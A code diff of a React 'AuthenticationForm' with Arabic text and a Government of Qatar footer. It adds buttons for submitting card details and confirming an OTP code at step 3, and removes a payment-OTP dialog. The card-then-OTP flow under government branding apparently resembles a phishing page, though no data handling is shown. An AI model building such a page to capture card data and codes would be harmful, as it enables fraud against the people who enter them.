+                {isLoading ? <span className="flex items-center gap-2"><svg className="animate-spin h-4 w-4" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" /></svg>جاري الإرسال...</span> : "إرسال البطاقة"}
+              </Button>
+            )}
+
+            {/* OTP submit button */}
+            {currentStep === 3 && cardPhase === "otp_input" && (
+              <Button onClick={handleOtpSubmit} disabled={isLoading} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 md:px-8 text-sm md:text-base">
+                {isLoading ? <span className="flex items-center gap-2"><svg className="animate-spin h-4 w-4" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" /></svg>جاري التحقق...</span> : "تأكيد الرمز"}
+              </Button>
+            )}
+
+            {/* Continue button for other steps */}
+            {currentStep !== 3 && currentStep < 7 && (
               <Button onClick={handleNext} disabled={isLoading} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 md:px-8 text-sm md:text-base">
-                {isLoading ? (
-                  <span className="flex items-center gap-2">
-                    <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
-                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
-                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
-                    </svg>
-                    جاري التحميل...
-                  </span>
-                ) : "استمر"}
+                {isLoading ? <span className="flex items-center gap-2"><svg className="animate-spin h-4 w-4" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" /></svg>جاري التحميل...</span> : "استمر"}
               </Button>
             )}
           </div>
@@ -605,39 +542,6 @@ export function AuthenticationForm() {
           <p>© 2025 حكومة قطر</p>
         </footer>
       </main>
-
-      <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
-        <DialogContent className="max-w-sm mx-4" dir="rtl">
-          <DialogHeader>
-            <DialogTitle className="text-lg md:text-xl font-bold text-center">تأكيد الدفع</DialogTitle>
-            <DialogDescription className="text-sm md:text-base text-center">
-              يرجى إدخال رمز التحقق المرسل إلى هاتفك {personalData.phone}
-            </DialogDescription>
-          </DialogHeader>
-          <div className="space-y-4 md:space-y-6 pt-4">
-            <div>
-              <Label htmlFor="paymentOtp" className="text-sm md:text-base mb-2 block text-center"><span className="text-red-500">*</span> رمز التحقق</Label>
-              <Input id="paymentOtp" value={paymentOtp} onChange={(e) => setPaymentOtp(e.target.value.replace(/\D/g, ""))} className={`bg-white text-center text-xl md:text-2xl tracking-[0.5em] font-bold ${errors.paymentOtp ? "border-red-500" : ""}`} maxLength={6} placeholder="000000" />
-              {errors.paymentOtp && <p className="text-red-500 text-xs mt-1 text-center">{errors.paymentOtp}</p>}
-              <p className="text-xs md:text-sm text-gray-500 text-center mt-2">الرمز صالح لمدة 5 دقائق فقط</p>
-            </div>
-            <div className="flex justify-center gap-3">
-              <Button variant="outline" onClick={() => setShowOtpDialog(false)} disabled={isLoading} className="px-6 text-sm md:text-base">إلغاء</Button>
-              <Button onClick={handleOtpVerification} disabled={isLoading} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 text-sm md:text-base">
-                {isLoading ? (
-                  <span className="flex items-center gap-2">
-                    <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
-                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
-                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
-                    </svg>
-                    جاري التحقق...
-                  </span>
-                ) : "تأكيد"}
-              </Button>
-            </div>
-          </div>
-        </DialogContent>
-      </Dialog>
     </div>
   )
 }
